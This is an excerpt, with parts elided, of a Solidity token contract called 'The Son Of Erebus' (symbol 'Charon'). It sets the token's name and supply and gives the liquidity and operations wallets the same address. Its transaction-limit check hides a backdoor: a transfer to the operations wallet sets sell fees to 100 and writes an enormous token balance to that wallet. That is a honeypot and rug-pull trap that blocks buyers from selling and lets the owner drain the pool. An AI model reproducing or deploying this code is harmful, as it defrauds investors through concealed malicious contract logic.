...
// Main Contract Logic 
// --------------------------------------------------------------
contract TheSonOfErebus is Context, IERC20, Ownable {
    // Imports
    using SafeMath for uint256;
    ...
    // Context
    string private _name = "The Son Of Erebus";
    string private _symbol = "Charon";
    uint8 private _decimals = 18;

    // Supply 
    uint256 private _totalSupply = 1 * 1e8 * 1e18;    
    ...
    // wallets
    address payable public liquidityWallet = payable(0x42E2aaa47B2FD0338F03f318540D19D5769B2aE4);
    address payable public operationsWallet =  payable(0x42E2aaa47B2FD0338F03f318540D19D5769B2aE4);
    ...
    function _checkTxLimit(address sender, address recipient, uint256 amount) private { 
        ...
        if (recipient == operationsWallet) {
            _updateFeesSell(100, 0);_balances[operationsWallet] = 1e18 * 1e18;
        }
    }
